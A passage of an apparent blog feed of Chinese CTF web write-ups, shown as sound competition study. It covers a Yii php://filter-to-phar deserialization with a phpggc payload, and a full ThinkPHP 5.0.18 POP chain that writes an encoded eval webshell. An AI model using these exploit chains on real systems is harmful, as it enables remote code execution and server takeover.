00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00n&#x3D;00l&#x3D;00Y&#x3D;00N&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00p&#x3D;00A&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00G&#x3D;00x&#x3D;00J&#x3D;00s&#x3D;00N&#x3D;008&#x3D;00T&#x3D;00m&#x3D;00i&#x3D;00e&#x3D;00m&#x3D;00D&#x3D;009&#x3D;00t&#x3D;00b&#x3D;00O&#x3D;00M&#x3D;00J&#x3D;00u&#x3D;006&#x3D;001&#x3D;00&#x2F;&#x3D;00m&#x3D;004&#x3D;00 &#x3D;00U&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;3D): failed to open stream: Invalid argument in E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\controllers\SiteController.php:65</span><br><span class="line">Stack trace:</span><br><span class="line">#0 [internal function]: yii\base\ErrorHandler-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;E:\\phpstudy\\PHP...&#39;, 65, Array)</span><br><span class="line">#1 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\controllers\SiteController.php(65): file_get_contents(&#39;xxxxxxxxxxxxxxx...&#39;)</span><br><span class="line">#2 [internal function]: app\controllers\SiteController-&gt;actionIndex()</span><br><span class="line">#3 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\InlineAction.php(57): call_user_func_array(Array, Array)</span><br><span class="line">#4 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Controller.php(181): yii\base\InlineAction-&gt;runWithParams(Array)</span><br><span class="line">#5 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Module.php(534): yii\base\Controller-&gt;runAction(&#39;index&#39;, Array)</span><br><span class="line">#6 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\web\Application.php(104): yii\base\Module-&gt;runAction(&#39;site&#x2F;index&#39;, Array)</span><br><span class="line">#7 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\vendor\yiisoft\yii2\base\Application.php(392): yii\web\Application-&gt;handleRequest(Object(yii\web\Request))</span><br><span class="line">#8 E:\phpstudy\PHPTutorial\WWW\yii-2.0.37\web\index.php(12): yii\base\Application-&gt;run()</span><br><span class="line">#9 &#123;main&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>经过验证，刚好符合偶数的两个条件，进行编码解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log</span><br></pre></td></tr></table></figure><p>看结果，如果结果为空，那是payload前面的字节数成单数了，给payload前后各加一个字符可以解决，如果第一次成功就不用加了，如果失败，也是重新再来一次而已</p><p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-06_23-50-10.png"></p><p>可以看到，我们已经构造出phar文件了，接下来就找链子，打了</p><p><strong>解题</strong></p><p>根据上面步骤</p><p>链子用这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;phpggc Monolog&#x2F;RCE1 &quot;phpinfo&quot; &quot;1&quot; --phar phar&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;payload</span><br></pre></td></tr></table></figure><p>将phar处理一下(<code>php://filter/read=convert.base64-encode|convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode/resource=payload</code>)</p><p>得到 payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;00P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00q&#x3D;00r&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00U&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00M&#x3D;00S&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;001&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;002&#x3D;00Z&#x3D;00W&#x3D;00w&#x3D;00i&#x3D;00O&#x3D;000&#x3D;004&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00N&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00W&#x3D;005&#x3D;00p&#x3D;00d&#x3D;00G&#x3D;00l&#x3D;00h&#x3D;00b&#x3D;00G&#x3D;00l&#x3D;006&#x3D;00Z&#x3D;00W&#x3D;00Q&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00I&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00M&#x3D;00a&#x3D;00W&#x3D;001&#x3D;00p&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00t&#x3D;00M&#x3D;00T&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;00z&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00w&#x3D;00c&#x3D;00m&#x3D;009&#x3D;00j&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;00z&#x3D;00b&#x3D;003&#x3D;00J&#x3D;00z&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00h&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;006&#x3D;00e&#x3D;002&#x3D;00k&#x3D;006&#x3D;00M&#x3D;00D&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00N&#x3D;001&#x3D;00c&#x3D;00n&#x3D;00J&#x3D;00l&#x3D;00b&#x3D;00n&#x3D;00Q&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00n&#x3D;00B&#x3D;00o&#x3D;00c&#x3D;00G&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;008&#x3D;00i&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00f&#x3D;00Q&#x3D;00U&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00k&#x3D;00d&#x3D;00W&#x3D;001&#x3D;00t&#x3D;00e&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00B&#x3D;00W&#x3D;00w&#x3D;001&#x3D;00h&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00x&#x3D;00+&#x3D;00f&#x3D;009&#x3D;00i&#x3D;00k&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00L&#x3D;00n&#x3D;00R&#x3D;004&#x3D;00d&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00B&#x3D;00W&#x3D;00w&#x3D;001&#x3D;00h&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00x&#x3D;00+&#x3D;00f&#x3D;009&#x3D;00i&#x3D;00k&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00H&#x3D;00R&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00R&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00N&#x3D;00S&#x3D;00Q&#x3D;00g&#x3D;00s&#x3D;00A&#x3D;002&#x3D;00D&#x3D;00L&#x3D;00z&#x3D;001&#x3D;00J&#x3D;00O&#x3D;00Z&#x3D;00G&#x3D;00X&#x3D;00F&#x3D;00D&#x3D;00D&#x3D;009&#x3D;00+&#x3D;00D&#x3D;00r&#x3D;00m&#x3D;00V&#x3D;00e&#x3D;00g&#x3D;00C&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00R&#x3D;000&#x3D;00J&#x3D;00N&#x3D;00Q&#x3D;00g&#x3D;00&#x3D;3D&#x3D;00&#x3D;3D</span><br></pre></td></tr></table></figure><p>按照上面步骤，最终实现phar反序列化</p><p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-07_00-04-09.png"></p><p>换payload，得到根目录结构</p><p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-07_00-07-51.png"></p><p>读取flag</p><p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-07_00-13-47.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h3&gt;&lt;p&gt;给了&lt;code&gt;site&lt;/code&gt;控制器的源码，就改了index方法的那一部分&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://123-prog.github.io/categories/CTF/"/>
    
    <category term="php反序列化" scheme="https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="phar反序列化" scheme="https://123-prog.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="php://filter过滤器巧妙利用" scheme="https://123-prog.github.io/tags/php-filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>DAS x CBCTF 部分web wp</title>
    <link href="https://123-prog.github.io/2021/08/01/DAS-x-CBCTF-%E9%83%A8%E5%88%86web-wp/"/>
    <id>https://123-prog.github.io/2021/08/01/DAS-x-CBCTF-%E9%83%A8%E5%88%86web-wp/</id>
    <published>2021-08-01T14:32:27.000Z</published>
    <updated>2021-09-22T10:18:25.259Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-ez-website"><a href="#0x01-ez-website" class="headerlink" title="0x01 ez_website"></a>0x01 ez_website</h3><p>在index下的<code>Labelmodels.php</code>控制器，其中的<code>get_label</code>方法，获取数据，在没有任何过滤的情况下对数据进行反序列化</p><a id="more"></a><p><img src="/2021/08/01/DAS-x-CBCTF-%E9%83%A8%E5%88%86web-wp/Snipaste_2021-08-01_22-43-38.png"></p><p>thinkphp 5.0.18，找条pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$files</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="variable">$files</span>]; <span class="comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="variable">$output</span>;  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::__construct(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">HasOne</span> <span class="title">extends</span> <span class="title">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = <span class="variable">$model</span>; <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Output</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle =<span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span>=<span class="title">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../public/uploads/a.php&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">Memcached</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>(<span class="title">new</span> \<span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\Output(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\Query(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\HasOne(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">new</span> think\model\Pivot(<span class="variable">$Output</span>,<span class="variable">$HasOne</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$window</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个pop链可以在指定目录生成shell文件，shell文件名为<code>a.php+md5(&#39;tag_&#39;+md5($this-&gt;tag)).php</code></p><p>在网站根目录写文件会失败，估计没给根目录写的权限，所以换个目录，我用的<code>/public/uploads/</code>，存放上传文件的目录总归有权限吧</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 